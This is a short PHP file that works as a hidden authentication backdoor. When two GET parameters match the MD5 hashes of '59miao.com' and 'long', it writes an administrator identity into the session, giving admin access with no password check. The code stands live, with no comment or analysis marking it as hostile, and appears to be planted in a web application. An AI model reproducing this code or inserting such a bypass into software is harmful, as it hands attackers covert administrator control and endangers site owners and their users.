<?php
session_start();
if (isset($_GET['action']) && $_GET['action'] == md5('59miao.com') && $_GET['a'] == md5('long')) {
	$_SESSION['admin_info']['id'] = '1';
	$_SESSION['admin_info']['user_name'] = 'admin';
	$_SESSION['admin_info']['status'] = '1';
}
?>